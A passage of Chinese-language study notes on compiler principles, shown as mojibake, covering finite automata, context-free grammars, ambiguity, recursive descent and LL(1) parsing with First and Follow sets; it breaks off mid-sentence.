src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200628161433100.png" class="" title="image-20200628161433100"><p>DFAåªæœ‰ä¸€æ¡é“å¯ä»¥é€šè¿‡</p><p>NFAåŸºäºè¾“å…¥æ‰§è¡Œï¼Œå¯èƒ½å¤„äºè®¸å¤šä¸åŒçš„çŠ¶æ€ï¼Œåªè¦æœ‰ä»»ä½•ä¸€æ¡è·¯å¾„å¯ä»¥æ¥å—ï¼Œå°±ä¼šå¤„äºæ¥å—çŠ¶æ€ ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å°±å±äºè¿™ä¸ªNFAå¯ä»¥æ¥å—çš„è¯­è¨€</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200628161945645.png" class="" title="image-20200628161945645"><p>NFAè¦è¿œæ¯”DFAæ¥çš„å°ï¼Œå¯ä»¥æˆå€ç¼©å°ï¼ŒDFAæ‰§è¡Œé€Ÿåº¦æ›´å¿«</p><h3 id="å°†æ­£åˆ™è¡¨è¾¾å¼è½¬æ¢ä¸ºNFA-éç¡®å®šæ€§æœ‰é™è‡ªåŠ¨æœº"><a href="#å°†æ­£åˆ™è¡¨è¾¾å¼è½¬æ¢ä¸ºNFA-éç¡®å®šæ€§æœ‰é™è‡ªåŠ¨æœº" class="headerlink" title="å°†æ­£åˆ™è¡¨è¾¾å¼è½¬æ¢ä¸ºNFA éç¡®å®šæ€§æœ‰é™è‡ªåŠ¨æœº"></a>å°†æ­£åˆ™è¡¨è¾¾å¼è½¬æ¢ä¸ºNFA éç¡®å®šæ€§æœ‰é™è‡ªåŠ¨æœº</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200628213856496.png" class="" title="image-20200628213856496"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200628213913515.png" class="" title="image-20200628213913515"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200628213950201.png" class="" title="image-20200628213950201"><h3 id="NFA-to-DFA"><a href="#NFA-to-DFA" class="headerlink" title="NFA to DFA"></a>NFA to DFA</h3><p>Epsilon-closureï¼šæ˜¯çŠ¶æ€é€‰æ‹©ï¼Œå¯ä»¥æ˜¯ä¸€ç»„çŠ¶æ€ï¼Œä½†åªé’ˆå¯¹å•ä¸ªçŠ¶æ€è¿›è¡Œå¤„ç†ï¼Œåªå…³æ³¨é‚£äº›ä»…é€šè¿‡ç©ºè·³å°±å¯ä»¥åˆ°è¾¾çš„çŠ¶æ€ã€‚</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200628215245905.png" class="" title="image-20200628215245905"><p>Nç§çŠ¶æ€ï¼Œå¯ç”¨çŠ¶æ€æ•°é‡å­é›†|S| &lt;= Nï¼Œå…¬ç”¨2^N -1ç§éç©ºå­é›†</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200628220546136.png" class="" title="image-20200628220546136"><p> æ‰€ç»´æŠ¤çš„æ¯ä¸€ä¸ªå±æ€§éƒ½æŒ‡ä»£ä¸€æ¡è®¡ç®—æ‰§è¡Œè·¯å¾„ï¼ŒDFAçš„çŠ¶æ€è®°å½•äº†NFAåŸºäºç›¸åŒè¾“å…¥å¯èƒ½è¿›å…¥çš„å¯èƒ½çŠ¶æ€é›†</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200628221202160.png" class="" title="image-20200628221202160"><p>åŸè§†é¢‘è®²è§£é“¾æ¥ï¼š<a href="https://www.bilibili.com/video/BV1cE411f78c?p=16">link</a> 11:15ç§’</p><h3 id="å®ç°æœ‰é™è‡ªåŠ¨æœº"><a href="#å®ç°æœ‰é™è‡ªåŠ¨æœº" class="headerlink" title="å®ç°æœ‰é™è‡ªåŠ¨æœº"></a>å®ç°æœ‰é™è‡ªåŠ¨æœº</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200628221706335.png" class="" title="image-20200628221706335"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200628222154758.png" class="" title="image-20200628222154758"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200629082652419.png" class="" title="image-20200629082652419"> <h4 id="å®ç°NFA"><a href="#å®ç°NFA" class="headerlink" title="å®ç°NFA"></a>å®ç°NFA</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200629083217424.png" class="" title="image-20200629083217424"><p>èŠ‚çœäº†å¤§é‡è¡¨ç©ºé—´ï¼Œä½†æ˜¯</p><p>æ‰§è¡Œé€Ÿåº¦æ¯”ç¡®å®šæ€§è‡ªåŠ¨æœºæ…¢å¾ˆå¤š </p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>DFAæ‰§è¡Œé€Ÿåº¦æ›´å¿«ï¼Œç»“æ„ä¸Šè¾ƒä¸ºæ¾æ•£</p><p>NFAé€Ÿåº¦è¾ƒæ…¢ï¼Œç»“æ„ç´§å‡‘</p><h3 id="PA2"><a href="#PA2" class="headerlink" title="PA2"></a>PA2</h3><p><a href="https://github.com/mrbelieve128/Stanford-Compilers-PA/tree/master/PA2">https://github.com/mrbelieve128/Stanford-Compilers-PA/tree/master/PA2</a></p><h2 id="è§£æå™¨-Parsing"><a href="#è§£æå™¨-Parsing" class="headerlink" title="è§£æå™¨ Parsing"></a>è§£æå™¨ Parsing</h2><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200707171225807.png" class="" title="image-20200707171225807"><h3 id="ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•-context-free-grammar"><a href="#ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•-context-free-grammar" class="headerlink" title="ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³• context-free grammar"></a>ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³• context-free grammar</h3><ul><li>ä¸æ˜¯æ‰€æœ‰tokenéƒ½æ˜¯ç¨‹åº</li><li>è§£æå™¨parseéœ€è¦åˆ†è¾¨æœ‰æ•ˆå’Œæ— æ•ˆçš„å­—ç¬¦ä¸²</li></ul><p>æ‰€ä»¥éœ€è¦</p><ul><li>éœ€è¦ä¸­ç®—æ³•æ¥åˆ†è¾¨æœ‰æ•ˆtoken</li><li>ç®—æ³•æ¥åˆ†è¾¨æœ‰æ•ˆtokenå’Œæ— æ•ˆtoken</li></ul><p>ä¸Šä¸‹æ–‡æ— å…³çš„æ–‡æ³•è‡ªç„¶è€Œç„¶åœ°ç”¨äºæè¿°è¿™ç§é€’å½’ç»“æ„</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708102409480.png" class="" title="image-20200708102409480"><p>ä¸Šä¸‹æ–‡æ— å…³çš„æ–‡æ³•åŒ…å«</p><ul><li>A set of terminals <strong>T</strong></li><li>A set of non-terminal <strong>N</strong></li><li>A start symbol <strong>S</strong> <strong>(S æ˜¯ Nä¹‹ä¸€)</strong></li><li>A set of productions (æ˜¯æŒ‡ä¸€ä¸ªç¬¦å·è·Ÿç€ä¸€ä¸ªç®­å¤´ï¼Œç´§æ¥ç€ä¸€ä¸²ç¬¦å·)</li></ul><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708103010382.png" class="" title="image-20200708103010382"><p><a href="https://www.bilibili.com/video/BV1cE411f78c?p=19">å®šä¹‰7:43å·¦å³</a></p><h3 id="æ¨å¯¼"><a href="#æ¨å¯¼" class="headerlink" title="æ¨å¯¼"></a>æ¨å¯¼</h3><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>Grammer</p><p>E -&gt; E+E | E*E | (E) | id</p><p>String</p><p>id * id + id</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708111200187.png" class="" title="image-20200708111200187"><p>A parse tree has</p><ul><li>Terminals at the leaves</li><li>Non-terminals at the interior nodes (å†…éƒ¨èŠ‚ç‚¹)</li></ul><p>å¶å­ç»“ç‚¹çš„ä¸­åºéå†ç»“æœæ˜¯åŸå§‹è¾“å…¥</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708111904374.png" class="" title="image-20200708111904374"><p>è§£ææ ‘ä¹Ÿå±•ç¤ºäº†æ“ä½œé—´çš„å…³è”æ€§ï¼Œä½†è¾“å…¥å­—ç¬¦ä¸²å¹¶æ²¡æœ‰å±•ç¤º</p><p>å¦‚ä¸Šå›¾ï¼Œ<strong>â€œ*â€</strong>è¦æ¯”<strong>â€œ+â€</strong>å·æ›´ä¼˜å…ˆï¼Œå› ä¸º*å·æ˜¯+å·çš„å­æ ‘</p><p>ä¸Šå›¾è¿™ä¸ªä¾‹å­æ˜¯æœ€å·¦æ¨å¯¼(åœ¨æ¯ä¸ªæ­¥éª¤å…ˆæ›¿æ¢æœ€å·¦è¾¹çš„éç»ˆç»“å­—ç¬¦ï¼‰ä¹Ÿæœ‰ä¸ªç­‰ä»·æ¦‚å¿µæœ€å³æ¨å¯¼</p><p>æœ€å·¦å’Œæœ€å³æ¨å¯¼ç”Ÿæˆçš„è§£ææ ‘éƒ½æ˜¯ä¸€æ ·çš„ </p><h4 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708113045442.png" class="" title="image-20200708113045442"><h3 id="Ambiguity-æ­§ä¹‰æ€§"><a href="#Ambiguity-æ­§ä¹‰æ€§" class="headerlink" title="Ambiguity æ­§ä¹‰æ€§"></a>Ambiguity æ­§ä¹‰æ€§</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708144341299.png" class=""><ul><li>å¦‚æœå¯¹äºæŸä¸ªå­—ç¬¦ä¸²æœ‰å¤šä¸ªè§£ææ ‘ï¼Œé‚£ä¹ˆè¿™ä¸ªè¯­æ³•å°±æ˜¯æ¨¡æ£±ä¸¤å¯çš„ã€‚æˆ–è€…è¯´ï¼Œå¯¹äºæŸä¸ªå­—ç¬¦ä¸²æœ‰å¤šä¸ªæœ€å³æ¨å¯¼æˆ–è€…æœ€å·¦æ¨å¯¼ï¼Œé‚£ä¹ˆè¿™ä¸ªå­—ç¬¦ä¸²å°±ä¼šæœ‰ä¸¤ä¸ªæˆªç„¶ä¸åŒçš„è§£ææ ‘ï¼Œè¯­æ³•ä¹Ÿä¼šå˜å¾—æœ‰æ­§ä¹‰</li><li>Ambiguity is <strong>BAD</strong></li></ul><p>æ¶ˆé™¤æ­§ä¹‰æ€§å¾—æœ€ç›´æ¥åŠæ³•æ˜¯é‡å†™è¯­æ³•ï¼Œç”Ÿæˆç›¸åŒè¯­æ³•ä½†ç”Ÿæˆå•ä¸€è§£ææ ‘ </p><p>E -&gt; Eâ€™ + E | Eâ€™</p><p>Eâ€™ -&gt; id * Eâ€™ | id | (E) * Eâ€™ | (E)</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708151619295.png" class="" title="image-20200708151619295"><h4 id="if-then-elseç»“æ„"><a href="#if-then-elseç»“æ„" class="headerlink" title="if-then-elseç»“æ„"></a>if-then-elseç»“æ„</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708152324929.png" class="" title="image-20200708152324929"><h4 id="æ€»ç»“-2"><a href="#æ€»ç»“-2" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><ul><li><p>Impossible to convert automatically an ambiguous grammar to an unambiguous one</p></li><li><p>User with care, ambiguity can simplify the grammar </p><blockquote><p>sometimes allows more natural definitions</p><p>We need disambiguation mechanisms</p></blockquote></li><li><p>Instead of rewriting the grammar</p><blockquote><p>Use the more natural (ambiguous) grammar</p><p>Along with disambiguating declarations</p></blockquote></li><li><p>Most tools allow precedence and associativity declarations(ä¼˜å…ˆæ€§å’Œå…³è”æ€§å£°æ˜) to disambiguate grammars</p></li></ul><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708153308814.png" class="" title="image-20200708153308814"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708153242579.png" class="" title="image-20200708153242579"><h3 id="é”™è¯¯å¤„ç†"><a href="#é”™è¯¯å¤„ç†" class="headerlink" title="é”™è¯¯å¤„ç†"></a>é”™è¯¯å¤„ç†</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708211223360.png" class="" title="image-20200708211223360"><h4 id="ç´§æ€¥æ¨¡å¼"><a href="#ç´§æ€¥æ¨¡å¼" class="headerlink" title="ç´§æ€¥æ¨¡å¼"></a>ç´§æ€¥æ¨¡å¼</h4><p>æœ€ç®€å•ï¼Œæœ€å¹¿æ³›ä½¿ç”¨çš„</p><p>æ£€æµ‹åˆ°é”™è¯¯ï¼Œè§£æå™¨ä¼šå¼€å§‹æŠ›å¼ƒ tokenç›´åˆ°æ‰¾åˆ°ä½œç”¨æ˜ç¡®çš„token</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708211933630.png" class="" title="image-20200708211933630"><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="é”™è¯¯äº§ç”Ÿå¼"><a href="#é”™è¯¯äº§ç”Ÿå¼" class="headerlink" title="é”™è¯¯äº§ç”Ÿå¼"></a>é”™è¯¯äº§ç”Ÿå¼</h4><p> å°†å¸¸çŠ¯çš„å·²çŸ¥é”™è¯¯æŒ‡å®šä¸ºè¯­æ³•ä¸­çš„æ›¿ä»£äº§ç”Ÿå¼</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708214135600.png" class="" title="image-20200708214135600"><h4 id="è‡ªåŠ¨å±€éƒ¨æˆ–å…¨å±€æ ¡æ­£"><a href="#è‡ªåŠ¨å±€éƒ¨æˆ–å…¨å±€æ ¡æ­£" class="headerlink" title="è‡ªåŠ¨å±€éƒ¨æˆ–å…¨å±€æ ¡æ­£"></a>è‡ªåŠ¨å±€éƒ¨æˆ–å…¨å±€æ ¡æ­£</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708214329681.png" class="" title="image-20200708214329681"><h3 id="æŠ½è±¡è¯­æ³•æ ‘-Abstract-Syntax-Trees"><a href="#æŠ½è±¡è¯­æ³•æ ‘-Abstract-Syntax-Trees" class="headerlink" title="æŠ½è±¡è¯­æ³•æ ‘ Abstract Syntax Trees"></a>æŠ½è±¡è¯­æ³•æ ‘ Abstract Syntax Trees</h3><ul><li>Like parse trees but ignore some details</li><li>Abbreviated as AST ï¼ˆç®€ç§°ASTï¼‰</li></ul><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708215810670.png" class="" title="image-20200708215810670"><p>ä¸‹å›¾è¡¨ç¤ºäº†ä¸Šå›¾ç›¸åŒçš„å†…å®¹</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708215745811.png" class="" title="image-20200708215745811"><h3 id="é€’å½’ä¸‹é™è§£æ"><a href="#é€’å½’ä¸‹é™è§£æ" class="headerlink" title="é€’å½’ä¸‹é™è§£æ"></a>é€’å½’ä¸‹é™è§£æ</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200709092646974.png" class="" title="image-20200709092646974"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200709093014117.png" class="" title="image-20200709093014117"><p>å°†Eå˜æˆä¸(int)ç›¸åŒçš„æ ¼å¼ä½¿ä¹‹å¯ä»¥åŒ¹é…ï¼Œåˆ™ç®—è§£ææˆåŠŸï¼Œæ‰€ä»¥E-&gt;T-&gt;(E)-&gt;(int)</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200709093210746.png" class="" title="image-20200709093210746"><h3 id="é€’å½’ä¸‹é™ç®—æ³•"><a href="#é€’å½’ä¸‹é™ç®—æ³•" class="headerlink" title="é€’å½’ä¸‹é™ç®—æ³•"></a>é€’å½’ä¸‹é™ç®—æ³•</h3><ul><li>Let TOKEN be the type of tokens<ul><li>Special tokens INT, OPEN, CLOSE, PLUS, TIMES</li></ul></li><li>Let the global <strong>next</strong> point to the next input token</li></ul><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200709093644246.png" class="" title="image-20200709093644246"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200709100234043.png" class="" title="image-20200709100234043"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200709100315068.png" class="" title="image-20200709100315068"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200709100353599.png" class="" title="image-20200709100353599"><h3 id="é€’å½’ä¸‹é™çš„å±€é™æ€§"><a href="#é€’å½’ä¸‹é™çš„å±€é™æ€§" class="headerlink" title="é€’å½’ä¸‹é™çš„å±€é™æ€§"></a>é€’å½’ä¸‹é™çš„å±€é™æ€§</h3><p><a href="https://www.bilibili.com/video/BV1cE411f78c?p=26">link</a></p><ul><li>if a production for non-terminal X suceeds<ul><li>canno backtrack to try a different production for X later</li></ul></li><li>General recurisive-descent algorithms support such â€œfullâ€ backtracking<ul><li>Can implement any grammar</li></ul></li></ul><h3 id="é€’å½’ä¸‹é™è§£æçš„ä¸»è¦éš¾ç‚¹-å·¦é€’å½’-left-recursion"><a href="#é€’å½’ä¸‹é™è§£æçš„ä¸»è¦éš¾ç‚¹-å·¦é€’å½’-left-recursion" class="headerlink" title="é€’å½’ä¸‹é™è§£æçš„ä¸»è¦éš¾ç‚¹-å·¦é€’å½’ left recursion"></a>é€’å½’ä¸‹é™è§£æçš„ä¸»è¦éš¾ç‚¹-å·¦é€’å½’ left recursion</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200709223432931.png" class="" title="image-20200709223432931"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200709223907932.png" class="" title="image-20200709223907932"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200709224244931.png" class="" title="image-20200709224244931"><h3 id="PA3"><a href="#PA3" class="headerlink" title="PA3"></a>PA3</h3><p><a href="https://github.com/mrbelieve128/Stanford-Compilers-PA/tree/master/PA3">https://github.com/mrbelieve128/Stanford-Compilers-PA/tree/master/PA3</a></p><h3 id="é¢„æµ‹è§£æ-Predictive-Parsers"><a href="#é¢„æµ‹è§£æ-Predictive-Parsers" class="headerlink" title="é¢„æµ‹è§£æ Predictive Parsers"></a>é¢„æµ‹è§£æ Predictive Parsers</h3><p>é¢„æµ‹è§£æå’Œé€’å½’ä¸‹é™å¾ˆåƒï¼Œä¾ç„¶æ˜¯è‡ªä¸Šè€Œä¸‹ï¼Œä½†èƒ½ä»ä¸å‡ºé”™çš„é¢„æµ‹è¯¥ä½¿ç”¨å“ªä¸€ä¸ªäº§ç”Ÿå¼ï¼Œå¹¶å¾—å‡ºæ­£ç¡®çš„è§£æã€‚</p><blockquote><ul><li>æ ¹æ®è¾“å…¥å­—ç¬¦ä¸²ä¸­å‡ºç°çš„å†…å®¹ï¼Œæ¥å°è¯•å¾—å‡ºè¯¥ä½¿ç”¨å“ªä¸ªäº§ç”Ÿå¼ã€‚åªé€‚åˆè¯­æ³•å½¢å¼å¾ˆå›ºå®šçš„æƒ…å†µ</li><li>ä¸éœ€è¦å›æ»šæ“ä½œã€‚è§£æå™¨å¯ä»¥å®Œå…¨è‚¯å®šè¦ä½¿ç”¨çš„äº§ç”Ÿå¼</li></ul><p>æ¥å— LL(K) è¯­æ³• (left-to-right ä»å·¦åˆ°å³ left-most derivate å§‹ç»ˆåŸºäºè§£ææ ‘ä¸Šæœ€å·¦éç»ˆç»“ç¬¦ k tokens lookahead)</p></blockquote><p>å¦‚</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200721124025300.png" class="" title="image-20200721124025300"><p>å®é™…ä¸Šæ˜¯ä½¿ç”¨è¡¨æ ¼è®°å½•æ•°æ®</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200721124104017.png" class="" title="image-20200721124104017"><p>ä½¿ç”¨æ ˆè®°å½•è¾¹ç•Œ</p><ul><li>æŠŠæœ€å·¦ç»ˆç»“ç¬¦æˆ–éç»ˆç»“ç¬¦å§‹ç»ˆæ”¾åœ¨æ ˆé¡¶</li></ul><h4 id="ç®—æ³•"><a href="#ç®—æ³•" class="headerlink" title="ç®—æ³•"></a>ç®—æ³•</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200721201621877.png" class="" title="image-20200721201621877"><ul><li>ä½¿ç”¨Så’Œ$åˆå§‹åŒ–æ ˆã€‚</li><li>$æ ‡è®°æ ˆåº•ï¼Œå¯ä»¥çœ‹ä½œè¾“å…¥ç»“æŸçš„æ ‡è®°ã€‚</li><li>å¦‚æœæ ˆé¡¶æ˜¯æœ€å·¦éç»ˆç»“ç¬¦ï¼Œæ ¹æ®è§£æè¡¨æ¥æŸ¥æ‰¾éç»ˆç»“ç¬¦ä¸ºXå’Œä¸‹ä¸€ä¸ªè¾“å…¥å­—ç¬¦æ‰€å¯¹åº”çš„äº§ç”Ÿå¼å³æ‰‹è¾¹å†…å®¹ï¼Œç„¶åå¼¹å‡ºæ ˆé¡¶çš„Xã€‚å¦‚æœä¸ç¬¦åˆå°±ä¼šæŠ¥é”™ï¼Œå› ä¸ºæ²¡æœ‰å›æ»šæ“ä½œï¼Œæ²¡æœ‰åŠæ³•è§£æå­—ç¬¦ä¸²ã€‚</li><li>å¦‚æœæ ˆé¡¶æ˜¯ç»ˆç»“ç¬¦çš„è¯ï¼Œè¯•ç€åŒ¹é…è¾“å…¥ï¼ŒåŒ¹é…æˆåŠŸå°±ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªè¾“å…¥å…ƒç´ ï¼Œç„¶åå¼¹å‡ºæ ˆé¡¶å…ƒç´ ã€‚å¦‚æœä¸ç¬¦åˆå°±ä¼šæŠ¥é”™ï¼Œå› ä¸ºæ²¡æœ‰å›æ»šæ“ä½œï¼Œæ²¡æœ‰åŠæ³•è§£æå­—ç¬¦ä¸²ã€‚</li></ul><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200721201531558.png" class="" title="image-20200721201531558"><h3 id="Firsté›†-First-Sets"><a href="#Firsté›†-First-Sets" class="headerlink" title="Firsté›† First Sets"></a>Firsté›† First Sets</h3><h4 id="æ„å»ºLL-1-è§£æè¡¨"><a href="#æ„å»ºLL-1-è§£æè¡¨" class="headerlink" title="æ„å»ºLL(1) è§£æè¡¨"></a>æ„å»ºLL(1) è§£æè¡¨</h4><p>non-terminal <strong>A</strong>, input singal t</p><p>ä»€ä¹ˆæ—¶å€™T[A,t] = Î±ï¼ˆæ„æ€æ˜¯è§£æè¡¨ä¸Š[A, T]è¿™ä¸€å•å…ƒæ ¼é‡Œçš„å†…å®¹æ˜¯Î±</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200722154608118.png" class="" title="image-20200722154608118"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200722160201765.png" class="" title="image-20200722160201765"><h4 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h4><p>å·¦è¾¹æ˜¯terminalçš„firsté›†ï¼ŒåªåŒ…å«è‡ªèº«ï¼Œå³è¾¹æ˜¯non-terminalçš„</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200722160742081.png" class="" title="image-20200722160742081"><h3 id="Followé›†-Follow-Sets"><a href="#Followé›†-Follow-Sets" class="headerlink" title="Followé›† Follow Sets"></a>Followé›† Follow Sets</h3><p>Followé›†ä¸­çš„å…ƒç´ æ˜¯é‚£äº›è¢«ç”¨åˆ°çš„å…ƒç´ è€Œä¸æ˜¯ç”Ÿæˆçš„ç¬¦å·ã€‚Îµä¸ä¼šåŠ è¿›Followé›†ä¸­</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200722162012683.png" class="" title="image-20200722162012683"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200722162135668.png" class="" title="image-20200722162135668"><h4 id="ä¸€äº›è§„åˆ™"><a href="#ä¸€äº›è§„åˆ™" class="headerlink" title="ä¸€äº›è§„åˆ™"></a>ä¸€äº›è§„åˆ™</h4><p> å‡ºç°åœ¨äº§ç”Ÿå¼å³ä¾§æœ«å°¾çš„ï¼Œå¦‚E -&gt; TX Follow(E) æ˜¯Follow(X)çš„å­é›†</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200722164420950.png" class="" title="image-20200722164420950"><p>è€Œåœ¨E -&gt; TX ä¸­ï¼ŒXå¯ä»¥æ¶ˆé™¤ï¼Œæ‰€ä»¥Follow(E) åŒæ ·æ˜¯Follow(T)ä¸­çš„å…ƒç´ </p><p>â€˜ ( â€˜çš„Followé›†å°±æ˜¯First(E)ä¸­æ‰€æœ‰å…ƒç´ ï¼Œè€ŒFirst(E) = First(T)</p><p>Follow(â€˜+â€™) = First(E)</p><p>Follow(int)å› 